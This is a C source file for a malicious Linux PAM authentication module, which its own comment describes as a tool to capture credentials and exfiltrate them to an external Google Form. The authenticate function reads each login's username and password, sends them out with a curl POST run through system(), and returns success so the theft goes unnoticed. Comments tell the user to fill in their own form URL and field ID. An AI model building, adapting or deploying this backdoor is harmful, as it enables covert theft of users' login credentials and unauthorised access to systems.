//capture the credentials and exfiltrate them to a external google form.
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL;
    const char *pass = NULL;

    // Get username
    if (pam_get_user(pamh, &user, NULL) != PAM_SUCCESS || user == NULL) {
        return PAM_USER_UNKNOWN;
    }

    // Get password
    if (pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL) != PAM_SUCCESS || pass == NULL) {
        return PAM_AUTH_ERR;
    }

    // Replace with your actual form field ID and form URL
    const char *field_id = "entry.1776303417";  // Change this value with your feild entry Id.
    const char *form_url = "https://docs.google.com/forms/d/e/xxxxxxxxxxxxxxxx/formResponse"; // replace this one with your own google form url

    // Build curl command to exfiltrate credentials
    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
        "curl -s -X POST -d \"%s=USER: %s PASS: %s\" \"%s\" >/dev/null 2>&1",
        field_id, user, pass, form_url);

    // Execute the curl command
    system(cmd);

    return PAM_SUCCESS;  // Allow login to continue
}

int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}
